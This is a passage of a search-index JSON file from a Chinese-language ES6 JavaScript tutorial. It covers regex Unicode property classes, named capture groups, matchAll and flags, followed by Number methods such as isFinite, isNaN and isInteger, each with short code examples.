<p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u540e\u884c\u65ad\u8a00\u7684\u53cd\u659c\u6760\u5f15\u7528\uff08<code>\\1</code>\uff09\u653e\u5728\u62ec\u53f7\u7684\u540e\u9762\uff0c\u5c31\u4e0d\u4f1a\u5f97\u5230\u5339\u914d\u7ed3\u679c\uff0c\u5fc5\u987b\u653e\u5728\u524d\u9762\u624d\u53ef\u4ee5\u3002\u56e0\u4e3a\u540e\u884c\u65ad\u8a00\u662f\u5148\u4ece\u5de6\u5230\u53f3\u626b\u63cf\uff0c\u53d1\u73b0\u5339\u914d\u4ee5\u540e\u518d\u56de\u8fc7\u5934\uff0c\u4ece\u53f3\u5230\u5de6\u5b8c\u6210\u53cd\u659c\u6760\u5f15\u7528\u3002</p>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#unicode","title":"Unicode \u5c5e\u6027\u7c7b","text":"<p>ES2018 \u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684\u7c7b\u7684\u5199\u6cd5<code>\\p{...}</code>\u548c<code>\\P{...}</code>\uff0c\u5141\u8bb8\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u7b26\u5408 Unicode \u67d0\u79cd\u5c5e\u6027\u7684\u6240\u6709\u5b57\u7b26\u3002</p> <pre><code>const regexGreekSymbol = /\\p{Script=Greek}/u;\nregexGreekSymbol.test('\u03c0') // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>\\p{Script=Greek}</code>\u6307\u5b9a\u5339\u914d\u4e00\u4e2a\u5e0c\u814a\u6587\u5b57\u6bcd\uff0c\u6240\u4ee5\u5339\u914d<code>\u03c0</code>\u6210\u529f\u3002</p> <p>Unicode \u5c5e\u6027\u7c7b\u8981\u6307\u5b9a\u5c5e\u6027\u540d\u548c\u5c5e\u6027\u503c\u3002</p> <pre><code>\\p{UnicodePropertyName=UnicodePropertyValue}\n</code></pre> <p>\u5bf9\u4e8e\u67d0\u4e9b\u5c5e\u6027\uff0c\u53ef\u4ee5\u53ea\u5199\u5c5e\u6027\u540d\uff0c\u6216\u8005\u53ea\u5199\u5c5e\u6027\u503c\u3002</p> <pre><code>\\p{UnicodePropertyName}\n\\p{UnicodePropertyValue}\n</code></pre> <p><code>\\P{\u2026}</code>\u662f<code>\\p{\u2026}</code>\u7684\u53cd\u5411\u5339\u914d\uff0c\u5373\u5339\u914d\u4e0d\u6ee1\u8db3\u6761\u4ef6\u7684\u5b57\u7b26\u3002</p> <p>\u6ce8\u610f\uff0c\u8fd9\u4e24\u79cd\u7c7b\u53ea\u5bf9 Unicode \u6709\u6548\uff0c\u6240\u4ee5\u4f7f\u7528\u7684\u65f6\u5019\u4e00\u5b9a\u8981\u52a0\u4e0a<code>u</code>\u4fee\u9970\u7b26\u3002\u5982\u679c\u4e0d\u52a0<code>u</code>\u4fee\u9970\u7b26\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528<code>\\p</code>\u548c<code>\\P</code>\u4f1a\u62a5\u9519\uff0cECMAScript \u9884\u7559\u4e86\u8fd9\u4e24\u4e2a\u7c7b\u3002</p> <p>\u7531\u4e8e Unicode \u7684\u5404\u79cd\u5c5e\u6027\u975e\u5e38\u591a\uff0c\u6240\u4ee5\u8fd9\u79cd\u65b0\u7684\u7c7b\u7684\u8868\u8fbe\u80fd\u529b\u975e\u5e38\u5f3a\u3002</p> <pre><code>const regex = /^\\p{Decimal_Number}+$/u;\nregex.test('\ud835\udfcf\ud835\udfd0\ud835\udfd1\ud835\udfdc\ud835\udfdd\ud835\udfde\ud835\udfe9\ud835\udfea\ud835\udfeb\ud835\udfec\ud835\udfed\ud835\udfee\ud835\udfef\ud835\udffa\ud835\udffb\ud835\udffc') // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5c5e\u6027\u7c7b\u6307\u5b9a\u5339\u914d\u6240\u6709\u5341\u8fdb\u5236\u5b57\u7b26\uff0c\u53ef\u4ee5\u770b\u5230\u5404\u79cd\u5b57\u578b\u7684\u5341\u8fdb\u5236\u5b57\u7b26\u90fd\u4f1a\u5339\u914d\u6210\u529f\u3002</p> <p><code>\\p{Number}</code>\u751a\u81f3\u80fd\u5339\u914d\u7f57\u9a6c\u6570\u5b57\u3002</p> <pre><code>// \u5339\u914d\u6240\u6709\u6570\u5b57\nconst regex = /^\\p{Number}+$/u;\nregex.test('\u00b2\u00b3\u00b9\u00bc\u00bd\u00be') // true\nregex.test('\u325b\u325c\u325d') // true\nregex.test('\u2160\u2161\u2162\u2163\u2164\u2165\u2166\u2167\u2168\u2169\u216a\u216b') // true\n</code></pre> <p>\u4e0b\u9762\u662f\u5176\u4ed6\u4e00\u4e9b\u4f8b\u5b50\u3002</p> <pre><code>// \u5339\u914d\u6240\u6709\u7a7a\u683c\n\\p{White_Space}\n\n// \u5339\u914d\u5404\u79cd\u6587\u5b57\u7684\u6240\u6709\u5b57\u6bcd\uff0c\u7b49\u540c\u4e8e Unicode \u7248\u7684 \\w\n[\\p{Alphabetic}\\p{Mark}\\p{Decimal_Number}\\p{Connector_Punctuation}\\p{Join_Control}]\n\n// \u5339\u914d\u5404\u79cd\u6587\u5b57\u7684\u6240\u6709\u975e\u5b57\u6bcd\u7684\u5b57\u7b26\uff0c\u7b49\u540c\u4e8e Unicode \u7248\u7684 \\W\n[^\\p{Alphabetic}\\p{Mark}\\p{Decimal_Number}\\p{Connector_Punctuation}\\p{Join_Control}]\n\n// \u5339\u914d Emoji\n/\\p{Emoji_Modifier_Base}\\p{Emoji_Modifier}?|\\p{Emoji_Presentation}|\\p{Emoji}\\uFE0F/gu\n\n// \u5339\u914d\u6240\u6709\u7684\u7bad\u5934\u5b57\u7b26\nconst regexArrows = /^\\p{Block=Arrows}+$/u;\nregexArrows.test('\u2190\u2191\u2192\u2193\u2194\u2195\u2196\u2197\u2198\u2199\u21cf\u21d0\u21d1\u21d2\u21d3\u21d4\u21d5\u21d6\u21d7\u21d8\u21d9\u21e7\u21e9') // true\n</code></pre>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#_6","title":"\u5177\u540d\u7ec4\u5339\u914d","text":""},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#_7","title":"\u7b80\u4ecb","text":"<p>\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528\u5706\u62ec\u53f7\u8fdb\u884c\u7ec4\u5339\u914d\u3002</p> <pre><code>const RE_DATE = /(\\d{4})-(\\d{2})-(\\d{2})/;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u91cc\u9762\u6709\u4e09\u7ec4\u5706\u62ec\u53f7\u3002\u4f7f\u7528<code>exec</code>\u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u5c06\u8fd9\u4e09\u7ec4\u5339\u914d\u7ed3\u679c\u63d0\u53d6\u51fa\u6765\u3002</p> <pre><code>const RE_DATE = /(\\d{4})-(\\d{2})-(\\d{2})/;\n\nconst matchObj = RE_DATE.exec('1999-12-31');\nconst year = matchObj[1]; // 1999\nconst month = matchObj[2]; // 12\nconst day = matchObj[3]; // 31\n</code></pre> <p>\u7ec4\u5339\u914d\u7684\u4e00\u4e2a\u95ee\u9898\u662f\uff0c\u6bcf\u4e00\u7ec4\u7684\u5339\u914d\u542b\u4e49\u4e0d\u5bb9\u6613\u770b\u51fa\u6765\uff0c\u800c\u4e14\u53ea\u80fd\u7528\u6570\u5b57\u5e8f\u53f7\uff08\u6bd4\u5982<code>matchObj[1]</code>\uff09\u5f15\u7528\uff0c\u8981\u662f\u7ec4\u7684\u987a\u5e8f\u53d8\u4e86\uff0c\u5f15\u7528\u7684\u65f6\u5019\u5c31\u5fc5\u987b\u4fee\u6539\u5e8f\u53f7\u3002</p> <p>ES2018 \u5f15\u5165\u4e86\u5177\u540d\u7ec4\u5339\u914d\uff08Named Capture Groups\uff09\uff0c\u5141\u8bb8\u4e3a\u6bcf\u4e00\u4e2a\u7ec4\u5339\u914d\u6307\u5b9a\u4e00\u4e2a\u540d\u5b57\uff0c\u65e2\u4fbf\u4e8e\u9605\u8bfb\u4ee3\u7801\uff0c\u53c8\u4fbf\u4e8e\u5f15\u7528\u3002</p> <pre><code>const RE_DATE = /(?&lt;year&gt;\\d{4})-(?&lt;month&gt;\\d{2})-(?&lt;day&gt;\\d{2})/;\n\nconst matchObj = RE_DATE.exec('1999-12-31');\nconst year = matchObj.groups.year; // 1999\nconst month = matchObj.groups.month; // 12\nconst day = matchObj.groups.day; // 31\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u201c\u5177\u540d\u7ec4\u5339\u914d\u201d\u5728\u5706\u62ec\u53f7\u5185\u90e8\uff0c\u6a21\u5f0f\u7684\u5934\u90e8\u6dfb\u52a0\u201c\u95ee\u53f7 + \u5c16\u62ec\u53f7 + \u7ec4\u540d\u201d\uff08<code>?&lt;year&gt;</code>\uff09\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5728<code>exec</code>\u65b9\u6cd5\u8fd4\u56de\u7ed3\u679c\u7684<code>groups</code>\u5c5e\u6027\u4e0a\u5f15\u7528\u8be5\u7ec4\u540d\u3002\u540c\u65f6\uff0c\u6570\u5b57\u5e8f\u53f7\uff08<code>matchObj[1]</code>\uff09\u4f9d\u7136\u6709\u6548\u3002</p> <p>\u5177\u540d\u7ec4\u5339\u914d\u7b49\u4e8e\u4e3a\u6bcf\u4e00\u7ec4\u5339\u914d\u52a0\u4e0a\u4e86 ID\uff0c\u4fbf\u4e8e\u63cf\u8ff0\u5339\u914d\u7684\u76ee\u7684\u3002\u5982\u679c\u7ec4\u7684\u987a\u5e8f\u53d8\u4e86\uff0c\u4e5f\u4e0d\u7528\u6539\u53d8\u5339\u914d\u540e\u7684\u5904\u7406\u4ee3\u7801\u3002</p> <p>\u5982\u679c\u5177\u540d\u7ec4\u6ca1\u6709\u5339\u914d\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684<code>groups</code>\u5bf9\u8c61\u5c5e\u6027\u4f1a\u662f<code>undefined</code>\u3002</p> <pre><code>const RE_OPT_A = /^(?&lt;as&gt;a+)?$/;\nconst matchObj = RE_OPT_A.exec('');\n\nmatchObj.groups.as // undefined\n'as' in matchObj.groups // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5177\u540d\u7ec4<code>as</code>\u6ca1\u6709\u627e\u5230\u5339\u914d\uff0c\u90a3\u4e48<code>matchObj.groups.as</code>\u5c5e\u6027\u503c\u5c31\u662f<code>undefined</code>\uff0c\u5e76\u4e14<code>as</code>\u8fd9\u4e2a\u952e\u540d\u5728<code>groups</code>\u662f\u59cb\u7ec8\u5b58\u5728\u7684\u3002</p>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#_8","title":"\u89e3\u6784\u8d4b\u503c\u548c\u66ff\u6362","text":"<p>\u6709\u4e86\u5177\u540d\u7ec4\u5339\u914d\u4ee5\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528\u89e3\u6784\u8d4b\u503c\u76f4\u63a5\u4ece\u5339\u914d\u7ed3\u679c\u4e0a\u4e3a\u53d8\u91cf\u8d4b\u503c\u3002</p> <pre><code>let {groups: {one, two}} = /^(?&lt;one&gt;.*):(?&lt;two&gt;.*)$/u.exec('foo:bar');\none  // foo\ntwo  // bar\n</code></pre> <p>\u5b57\u7b26\u4e32\u66ff\u6362\u65f6\uff0c\u4f7f\u7528<code>$&lt;\u7ec4\u540d&gt;</code>\u5f15\u7528\u5177\u540d\u7ec4\u3002</p> <pre><code>let re = /(?&lt;year&gt;\\d{4})-(?&lt;month&gt;\\d{2})-(?&lt;day&gt;\\d{2})/u;\n\n'2015-01-02'.replace(re, '$&lt;day&gt;/$&lt;month&gt;/$&lt;year&gt;')\n// '02/01/2015'\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>replace</code>\u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u800c\u4e0d\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u3002</p> <p><code>replace</code>\u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e5f\u53ef\u4ee5\u662f\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u7684\u53c2\u6570\u5e8f\u5217\u5982\u4e0b\u3002</p> <pre><code>'2015-01-02'.replace(re, (\n   matched, // \u6574\u4e2a\u5339\u914d\u7ed3\u679c 2015-01-02\n   capture1, // \u7b2c\u4e00\u4e2a\u7ec4\u5339\u914d 2015\n   capture2, // \u7b2c\u4e8c\u4e2a\u7ec4\u5339\u914d 01\n   capture3, // \u7b2c\u4e09\u4e2a\u7ec4\u5339\u914d 02\n   position, // \u5339\u914d\u5f00\u59cb\u7684\u4f4d\u7f6e 0\n   S, // \u539f\u5b57\u7b26\u4e32 2015-01-02\n   groups // \u5177\u540d\u7ec4\u6784\u6210\u7684\u4e00\u4e2a\u5bf9\u8c61 {year, month, day}\n ) =&gt; {\n let {day, month, year} = groups;\n return `${day}/${month}/${year}`;\n});\n</code></pre> <p>\u5177\u540d\u7ec4\u5339\u914d\u5728\u539f\u6765\u7684\u57fa\u7840\u4e0a\uff0c\u65b0\u589e\u4e86\u6700\u540e\u4e00\u4e2a\u51fd\u6570\u53c2\u6570\uff1a\u5177\u540d\u7ec4\u6784\u6210\u7684\u4e00\u4e2a\u5bf9\u8c61\u3002\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u76f4\u63a5\u5bf9\u8fd9\u4e2a\u5bf9\u8c61\u8fdb\u884c\u89e3\u6784\u8d4b\u503c\u3002</p>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#_9","title":"\u5f15\u7528","text":"<p>\u5982\u679c\u8981\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u5185\u90e8\u5f15\u7528\u67d0\u4e2a\u201c\u5177\u540d\u7ec4\u5339\u914d\u201d\uff0c\u53ef\u4ee5\u4f7f\u7528<code>\\k&lt;\u7ec4\u540d&gt;</code>\u7684\u5199\u6cd5\u3002</p> <pre><code>const RE_TWICE = /^(?&lt;word&gt;[a-z]+)!\\k&lt;word&gt;$/;\nRE_TWICE.test('abc!abc') // true\nRE_TWICE.test('abc!ab') // false\n</code></pre> <p>\u6570\u5b57\u5f15\u7528\uff08<code>\\1</code>\uff09\u4f9d\u7136\u6709\u6548\u3002</p> <pre><code>const RE_TWICE = /^(?&lt;word&gt;[a-z]+)!\\1$/;\nRE_TWICE.test('abc!abc') // true\nRE_TWICE.test('abc!ab') // false\n</code></pre> <p>\u8fd9\u4e24\u79cd\u5f15\u7528\u8bed\u6cd5\u8fd8\u53ef\u4ee5\u540c\u65f6\u4f7f\u7528\u3002</p> <pre><code>const RE_TWICE = /^(?&lt;word&gt;[a-z]+)!\\k&lt;word&gt;!\\1$/;\nRE_TWICE.test('abc!abc!abc') // true\nRE_TWICE.test('abc!abc!ab') // false\n</code></pre>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#matchall","title":"matchAll","text":"<p>\u5982\u679c\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u5728\u5b57\u7b26\u4e32\u91cc\u9762\u6709\u591a\u4e2a\u5339\u914d\uff0c\u73b0\u5728\u4e00\u822c\u4f7f\u7528<code>g</code>\u4fee\u9970\u7b26\u6216<code>y</code>\u4fee\u9970\u7b26\uff0c\u5728\u5faa\u73af\u91cc\u9762\u9010\u4e00\u53d6\u51fa\u3002</p> <pre><code>var regex = /t(e)(st(\\d?))/g;\nvar string = 'test1test2test3';\n\nvar matches = [];\nvar match;\nwhile (match = regex.exec(string)) {\n  matches.push(match);\n}\n\nmatches\n// [\n//   [\"test1\", \"e\", \"st1\", \"1\", index: 0, input: \"test1test2test3\"],\n//   [\"test2\", \"e\", \"st2\", \"2\", index: 5, input: \"test1test2test3\"],\n//   [\"test3\", \"e\", \"st3\", \"3\", index: 10, input: \"test1test2test3\"]\n// ]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>while</code>\u5faa\u73af\u53d6\u51fa\u6bcf\u4e00\u8f6e\u7684\u6b63\u5219\u5339\u914d\uff0c\u4e00\u5171\u4e09\u8f6e\u3002</p> <p>\u76ee\u524d\u6709\u4e00\u4e2a\u63d0\u6848\uff0c\u589e\u52a0\u4e86<code>String.prototype.matchAll</code>\u65b9\u6cd5\uff0c\u53ef\u4ee5\u4e00\u6b21\u6027\u53d6\u51fa\u6240\u6709\u5339\u914d\u3002\u4e0d\u8fc7\uff0c\u5b83\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u904d\u5386\u5668\uff08Iterator\uff09\uff0c\u800c\u4e0d\u662f\u6570\u7ec4\u3002</p> <pre><code>const string = 'test1test2test3';\n\n// g \u4fee\u9970\u7b26\u52a0\u4e0d\u52a0\u90fd\u53ef\u4ee5\nconst regex = /t(e)(st(\\d?))/g;\n\nfor (const match of string.matchAll(regex)) {\n  console.log(match);\n}\n// [\"test1\", \"e\", \"st1\", \"1\", index: 0, input: \"test1test2test3\"]\n// [\"test2\", \"e\", \"st2\", \"2\", index: 5, input: \"test1test2test3\"]\n// [\"test3\", \"e\", \"st3\", \"3\", index: 10, input: \"test1test2test3\"]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e<code>string.matchAll(regex)</code>\u8fd4\u56de\u7684\u662f\u904d\u5386\u5668\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528<code>for...of</code>\u5faa\u73af\u53d6\u51fa\u3002\u76f8\u5bf9\u4e8e\u8fd4\u56de\u6570\u7ec4\uff0c\u8fd4\u56de\u904d\u5386\u5668\u7684\u597d\u5904\u5728\u4e8e\uff0c\u5982\u679c\u5339\u914d\u7ed3\u679c\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u6570\u7ec4\uff0c\u90a3\u4e48\u904d\u5386\u5668\u6bd4\u8f83\u8282\u7701\u8d44\u6e90\u3002</p> <p>\u904d\u5386\u5668\u8f6c\u4e3a\u6570\u7ec4\u662f\u975e\u5e38\u7b80\u5355\u7684\uff0c\u4f7f\u7528<code>...</code>\u8fd0\u7b97\u7b26\u548c<code>Array.from</code>\u65b9\u6cd5\u5c31\u53ef\u4ee5\u4e86\u3002</p> <pre><code>// \u8f6c\u4e3a\u6570\u7ec4\u65b9\u6cd5\u4e00\n[...string.matchAll(regex)]\n\n// \u8f6c\u4e3a\u6570\u7ec4\u65b9\u6cd5\u4e8c\nArray.from(string.matchAll(regex));\n</code></pre>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#flags","title":"flags \u5c5e\u6027","text":"<p>ES6 \u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u65b0\u589e\u4e86<code>flags</code>\u5c5e\u6027\uff0c\u4f1a\u8fd4\u56de\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4fee\u9970\u7b26\u3002</p> <pre><code>// ES5 \u7684 source \u5c5e\u6027\n// \u8fd4\u56de\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u6b63\u6587\n/abc/ig.source\n// \"abc\"\n\n// ES6 \u7684 flags \u5c5e\u6027\n// \u8fd4\u56de\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4fee\u9970\u7b26\n/abc/ig.flags\n// 'gi'\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/","title":"ES6\u6570\u503c","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 19660  \u9605\u8bfb40\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#_1","title":"\u4e8c\u8fdb\u5236\u548c\u516b\u8fdb\u5236\u8868\u793a\u6cd5","text":"<p>ES6 \u63d0\u4f9b\u4e86\u4e8c\u8fdb\u5236\u548c\u516b\u8fdb\u5236\u6570\u503c\u7684\u65b0\u7684\u5199\u6cd5\uff0c\u5206\u522b\u7528\u524d\u7f00<code>0b</code>\uff08\u6216<code>0B</code>\uff09\u548c<code>0o</code>\uff08\u6216<code>0O</code>\uff09\u8868\u793a\u3002\u5982\u679c\u8981\u5c06<code>0b</code>\u548c<code>0o</code>\u524d\u7f00\u7684\u5b57\u7b26\u4e32\u6570\u503c\u8f6c\u4e3a\u5341\u8fdb\u5236\uff0c\u8981\u4f7f\u7528<code>Number</code>\u65b9\u6cd5\u3002</p> <pre><code>0b111110111 === 503 // true\n0o767 === 503 // true\n\nNumber('0b111')  // 7\nNumber('0o10')  // 8\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#numberisfinite-numberisnan","title":"Number.isFinite() Number.isNaN()","text":"<p>ES6 \u5728<code>Number</code>\u5bf9\u8c61\u4e0a\uff0c\u65b0\u63d0\u4f9b\u4e86<code>Number.isFinite()</code>\u548c<code>Number.isNaN()</code>\u4e24\u4e2a\u65b9\u6cd5\u3002</p> <p><code>Number.isFinite()</code>\u7528\u6765\u68c0\u67e5\u4e00\u4e2a\u6570\u503c\u662f\u5426\u4e3a\u6709\u9650\u7684\uff08finite\uff09\uff0c\u5373\u4e0d\u662f<code>Infinity</code>\u3002\u6ce8\u610f\uff0c\u5982\u679c\u53c2\u6570\u7c7b\u578b\u4e0d\u662f\u6570\u503c\uff0c<code>Number.isFinite</code>\u4e00\u5f8b\u8fd4\u56de<code>false</code>\u3002</p> <pre><code>Number.isFinite(15); // true\nNumber.isFinite(0.8); // true\n\nNumber.isFinite(NaN); // false\nNumber.isFinite(Infinity); // false\nNumber.isFinite(-Infinity); // false\nNumber.isFinite('foo'); // false\nNumber.isFinite('15'); // false\nNumber.isFinite(true); // false\n</code></pre> <p><code>Number.isNaN()</code>\u7528\u6765\u68c0\u67e5\u4e00\u4e2a\u503c\u662f\u5426\u4e3a<code>NaN</code>\u3002</p> <pre><code>Number.isNaN(NaN) // true\nNumber.isNaN(9/NaN) // true\nNumber.isNaN('true' / 0) // true\nNumber.isNaN('true' / 'true') // true\n\nNumber.isNaN(15) // false\nNumber.isNaN('15') // false\nNumber.isNaN(true) // false\n</code></pre> <p>\u5982\u679c\u53c2\u6570\u7c7b\u578b\u4e0d\u662f<code>NaN</code>\uff0c<code>Number.isNaN</code>\u4e00\u5f8b\u8fd4\u56de<code>false</code>\u3002</p> <p>\u5b83\u4eec\u4e0e\u4f20\u7edf\u7684\u5168\u5c40\u65b9\u6cd5<code>isFinite()</code>\u548c<code>isNaN()</code>\u7684\u533a\u522b\u5728\u4e8e\uff0c\u4f20\u7edf\u65b9\u6cd5\u5148\u8c03\u7528<code>Number()</code>\u5c06\u975e\u6570\u503c\u7684\u503c\u8f6c\u4e3a\u6570\u503c\uff0c\u518d\u8fdb\u884c\u5224\u65ad\uff0c\u800c\u8fd9\u4e24\u4e2a\u65b0\u65b9\u6cd5\u53ea\u5bf9\u6570\u503c\u6709\u6548\uff0c<code>Number.isFinite()</code>\u5bf9\u4e8e\u975e\u6570\u503c\u4e00\u5f8b\u8fd4\u56de<code>false</code>, <code>Number.isNaN()</code>\u53ea\u6709\u5bf9\u4e8e<code>NaN</code>\u624d\u8fd4\u56de<code>true</code>\uff0c\u975e<code>NaN</code>\u4e00\u5f8b\u8fd4\u56de<code>false</code>\u3002</p> <pre><code>isFinite(25) // true\nisFinite(\"25\") // true\nNumber.isFinite(25) // true\nNumber.isFinite(\"25\") // false\n\nisNaN(NaN) // true\nisNaN(\"NaN\") // true\nNumber.isNaN(NaN) // true\nNumber.isNaN(\"NaN\") // false\nNumber.isNaN(1) // false\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#numberparseint-numberparsefloat","title":"Number.parseInt(), Number.parseFloat()","text":"<p>ES6 \u5c06\u5168\u5c40\u65b9\u6cd5<code>parseInt()</code>\u548c<code>parseFloat()</code>\uff0c\u79fb\u690d\u5230<code>Number</code>\u5bf9\u8c61\u4e0a\u9762\uff0c\u884c\u4e3a\u5b8c\u5168\u4fdd\u6301\u4e0d\u53d8\u3002</p> <pre><code>// ES5\u7684\u5199\u6cd5\nparseInt('12.34') // 12\nparseFloat('123.45#') // 123.45\n\n// ES6\u7684\u5199\u6cd5\nNumber.parseInt('12.34') // 12\nNumber.parseFloat('123.45#') // 123.45\n</code></pre> <p>\u8fd9\u6837\u505a\u7684\u76ee\u7684\uff0c\u662f\u9010\u6b65\u51cf\u5c11\u5168\u5c40\u6027\u65b9\u6cd5\uff0c\u4f7f\u5f97\u8bed\u8a00\u9010\u6b65\u6a21\u5757\u5316\u3002</p> <pre><code>Number.parseInt === parseInt // true\nNumber.parseFloat === parseFloat // true\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#numberisinteger","title":"Number.isInteger()","text":"<p><code>Number.isInteger()</code>\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u6570\u503c\u662f\u5426\u4e3a\u6574\u6570\u3002</p> <pre><code>Number.isInteger(25) // true\nNumber.isInteger(25.1) // false\n</code></pre> <p>JavaScript \u5185\u90e8\uff0c\u6574\u6570\u548c\u6d6e\u70b9\u6570\u91c7\u7528\u7684\u662f\u540c\u6837\u7684\u50a8\u5b58\u65b9\u6cd5\uff0c\u6240\u4ee5 25 \u548c 25.0 \u88ab\u89c6\u4e3a\u540c\u4e00\u4e2a\u503c\u3002</p> <pre><code>Number.isInteger(25) // true\nNumber.isInteger(25.0) // true\n</code></pre> <p>\u5982\u679c\u53c2\u6570\u4e0d\u662f\u6570\u503c\uff0c<code>Number.isInteger</code>\u8fd4\u56de<code>false</code>\u3002</p> <pre><code>Number.isInteger() // false\nNumber.isInteger(null) // false\nNumber.isInteger('15') // false\nNumber.isInteger(true) // false\n</code></pre> <p>\u6ce8\u610f\uff0c\u7531\u4e8e JavaScript \u91c7\u7528 IEEE 754 \u6807\u51c6\uff0c\u6570\u503c\u5b58\u50a8\u4e3a64\u4f4d\u53cc\u7cbe\u5ea6\u683c\u5f0f\uff0c\u6570\u503c\u7cbe\u5ea6\u6700\u591a\u53ef\u4ee5\u8fbe\u5230 53 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff081 \u4e2a\u9690\u85cf\u4f4d\u4e0e 52 \u4e2a\u6709\u6548\u4f4d\uff09\u3002\u5982\u679c\u6570\u503c\u7684\u7cbe\u5ea6\u8d85\u8fc7\u8fd9\u4e2a\u9650\u5ea6\uff0c\u7b2c54\u4f4d\u53ca\u540e\u9762\u7684\u4f4d\u5c31\u4f1a\u88ab\u4e22\u5f03\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c<code>Number.isInteger</code>\u53ef\u80fd\u4f1a\u8bef\u5224\u3002</p> <pre><code>Number.isInteger(3.0000000000000002) // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Number.isInteger</code>\u7684\u53c2\u6570\u660e\u660e\u4e0d\u662f\u6574\u6570\uff0c\u4f46\u662f\u4f1a\u8fd4\u56de<code>true</code>\u3002\u539f\u56e0\u5c31\u662f\u8fd9\u4e2a\u5c0f\u6570\u7684\u7cbe\u5ea6\u8fbe\u5230\u4e86\u5c0f\u6570\u70b9\u540e16\u4e2a\u5341\u8fdb\u5236\u4f4d\uff0c\u8f6c\u6210\u4e8c\u8fdb\u5236\u4f4d\u8d85\u8fc7\u4e8653\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u5bfc\u81f4\u6700\u540e\u7684\u90a3\u4e2a<code>2</code>\u88ab\u4e22\u5f03\u4e86\u3002</p> <p>\u7c7b\u4f3c\u7684\u60c5\u51b5\u8fd8\u6709\uff0c\u5982\u679c\u4e00\u4e2a\u6570\u503c\u7684\u7edd\u5bf9\u503c\u5c0f\u4e8e<code>Number.MIN_VALUE</code>\uff085E-324\uff09\uff0c\u5373\u5c0f\u4e8e JavaScript \u80fd\u591f\u5206\u8fa8\u7684\u6700\u5c0f\u503c\uff0c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a 0\u3002\u8fd9\u65f6\uff0c<code>Number.isInteger</code>\u4e5f\u4f1a\u8bef\u5224\u3002</p> <pre><code>Number.isInteger(5E-324) // false\nNumber.isInteger(5E-325) // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>5E-325</code>\u7531\u4e8e\u503c\u592a\u5c0f\uff0c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a0\uff0c\u56e0\u6b64\u8fd4\u56de<code>true</code>\u3002</p> 